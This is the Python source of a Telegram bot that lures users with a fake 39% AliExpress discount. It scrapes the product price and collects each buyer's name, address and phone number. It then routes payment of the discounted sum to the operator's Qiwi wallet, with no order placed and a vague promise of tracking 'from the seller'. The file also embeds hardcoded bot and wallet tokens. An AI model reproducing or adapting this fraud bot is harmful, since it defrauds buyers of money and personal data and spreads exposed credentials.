import requests
import re
import logging
import time
import pyqiwi
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import ReplyKeyboardMarkup,KeyboardButton
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
API_TOKEN = '1033820632:AAHRRUU8SHIPnPPTi25im06en20D2LxLSq4'
logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
wallet1 = pyqiwi.Wallet(token='400646e9cc8dd9687955e7ccc238122d', number='7776757968')
waletos_1=wallet1.balance()
if waletos_1<59000:
    key='48e7qUxn9T7RyYE1MVZswX1FRSbE6iyCj2gCRwwF3Dnh5XrasNTx3BGPiMsyXQFNKQhvukniQG8RTVhYm3iP4rAZWjBqvBwpbzWZMf5GVMDkZk6jUGBTzHig4MqzjYTR1VQ24pq9LHq2odiS1Agv9AyLNfLA5DBsr7pnHEfxEEqveFxUhCjHv4YTGZkQH'
else:
    async def warning_1(message:types.Message):
        await bot.send_message(chat_id='828223875',text='Предупреждение Кошелек номер 1 переполнен!')
    key='48e7qUxn9T7RyYE1MVZswX1FRSbE6iyCj2gCRwwF3Dnh5XrasNTx3BGPiMsyXQFNKQhvukniQG8RTVhYm3iP41tfXFtP5yVbsgQ2CcFAC73sE33oxtMFfRE7EDGbkokiS99QSygFUHzU8pscRrAVD9wQKhsYQoqDyjH7VcMJbufB2qqEyCmqrV3uxsM8k'
menu=ReplyKeyboardMarkup(
    keyboard=[
        [
            KeyboardButton(text="Ввести ссылку на товар"),

        ],
     ],
     resize_keyboard=True
)  
@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    await message.answer('Поздравляю вас , вы счастливчик,для вас скидка на все товары 39% \nВажное примечание Номер отслеживания будет вам отправлен продавцом , только после подтверждения им же🙄',reply_markup=menu)
menu_2=ReplyKeyboardMarkup(
    keyboard=[
        [
            KeyboardButton(text="Ввести данные для доставки и спецификацию товара"),

        ],
     ],
     resize_keyboard=True
)
payment=ReplyKeyboardMarkup(
    keyboard=[
        [
            KeyboardButton(text="Оплатить товар"),

        ],
     ],
     resize_keyboard=True
)
@dp.message_handler()
async def message_finder(message:types.Message):
    if "Ввести ссылку на товар" in message.text:
        await bot.send_message(chat_id=message.from_user.id,text='<b>Жду ввода ссылки на товар🥺,который вы собираетесь приобрести, вот такого типа: https://aliexpress.ru/item.......</b>',parse_mode="HTML")
    if 'https:' in message.text:
        if 'star.ali' in message.text:
            import re
            text=''
            text=message.text
            parse_text=re.findall('\d\d\d\d\d\d\d\d\d\d\d+',text)
            ##print(pars_text[0])
            ##await bot.send_message(chat_id=message.from_user.id,text=pars_text)
            ## https://aliexpress.ru/item/33057629878.html?srcSns=sns_Copy&tid=white_backgroup_101&mb=42zWXK4ZV87GYoO&invitationCode=ZUVKMWVjVkEzU3l1clV4M1NyNDh4NVIvZFU5c1RCOHF6djcyMWYrdEhPcFpNOGEzQ3lrRW1nPT0&businessType=ProductDetail&businessType=ProductDetail&spreadType=socialShare&platform=AE
            link_1='https://aliexpress.ru/item/'+parse_text[0]
            link=link_1+'.html?srcSns=sns_Copy&tid=white_backgroup_101&mb=42zWXK4ZV87GYoO&invitationCode=ZUVKMWVjVkEzU3l1clV4M1NyNDh4NVIvZFU5c1RCOHF6djcyMWYrdEhPcFpNOGEzQ3lrRW1nPT0&businessType=ProductDetail&businessType=ProductDetail&spreadType=socialShare&platform=AE'
        else:
            link = message.text
        re = requests.get(link)
        cost = re.text.split('totalValue: "')[1].split('"')[0]
        cost_1='Итоговая стоимость товара(учитывая спецификации товара): '+cost
        await bot.send_message(chat_id=message.from_user.id,text=cost_1)
        cost_2=cost[:-8]
        cost_2=cost_2.replace(u'\xa0', u' ')
        cost_2=cost_2.replace(' ','')
        cost_5=float(cost_2)
        cost_4=cost_5*0.63
        with open('finish.txt','w') as file:
            file.write(str(cost_4))
        cost_3='С вас к зачислению: ' + str(cost_4)+' руб'
        await message.answer(cost_3,reply_markup=menu_2)
    if 'Ввести данные для доставки и спецификацию товара' in message.text:
        await bot.send_message(chat_id=message.from_user.id,text="<i>Жду ввода контактных данных , адрес для доставки и спецификацию товара \nПросьба вводить данные четко по данному примеру: \n**Адрес:Пушкина дом 2 \n   Номер телефона:8777777777 \n   ФИО:Иванов Иван Иванович \n   Спецификая товара:размер XL / 128Gb / Цвет черный и т.д**</i>",parse_mode="HTML")
    if 'Адрес'in message.text:
        await message.answer('Для вашего удобства мы будем пользоваться системой приема платежей  "Qiwi Касса", поэтому последующие платежи буду проходить через нее🤩',reply_markup=payment)
    if 'Оплатить товар' in message.text:
        payment_step_1='https://oplata.qiwi.com/create?publicKey='
        payment_step_2=payment_step_1+str(key)
        payment_step_3=payment_step_2+'&amount='
        with open('finish.txt','r') as file:
            finish=file.read()
        payment_step_4=payment_step_3+finish
        media = types.MediaGroup()
        media.attach_photo(types.InputFile('qiwi.png'))
        await message.answer_media_group(media=media)
        markup = types.InlineKeyboardMarkup()
        btn_my_site= types.InlineKeyboardButton(text='Оплата углуг =)', url=payment_step_4)
        markup.add(btn_my_site)
        await bot.send_message(chat_id=message.from_user.id,text="Оплатите услуги,нажав на кнопку снизу :D", reply_markup = markup)
        time.sleep(120)
        await bot.send_message(chat_id=message.from_user.id,text='Спасибо , что пользутесь нашими услугами 🤗')
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
